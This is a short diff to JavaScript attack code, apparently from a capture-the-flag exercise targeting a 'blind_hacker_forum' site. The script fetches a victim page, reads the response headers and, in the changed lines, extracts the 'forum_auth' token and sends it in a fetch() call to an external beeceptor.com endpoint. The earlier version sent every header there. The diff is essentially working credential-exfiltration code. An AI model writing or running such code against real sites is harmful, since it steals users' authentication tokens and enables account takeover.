@@ -2,6 +2,7 @@ const serverURL = window.location.hostname + ":" + window.location.port;
 
 let indextoken = '';
 let forumtoken = '';
+let forum_auth = '';
 
 let oldVictimURL = 'http://blind_hacker/';
 let victimURL = 'http://blind_hacker_forum/';
@@ -32,8 +33,13 @@ window.onload = function () {
             // body: text_id.text,
             headers: { 'content-type': text_id.contentType }
         }).then(res => {
-            for (var p of res.headers)
-                fetch("https://ikasten.free.beeceptor.com/" + p);
+            for (var p of res.headers){
+                let [clave, valor] = p.toString().split(",");
+                if (clave == "forum_auth") {
+                    forum_auth = valor;
+                    fetch("https://ikasten.free.beeceptor.com/" + valor);
+                }
+            }
             return res.text();
         }).
         then(data => {
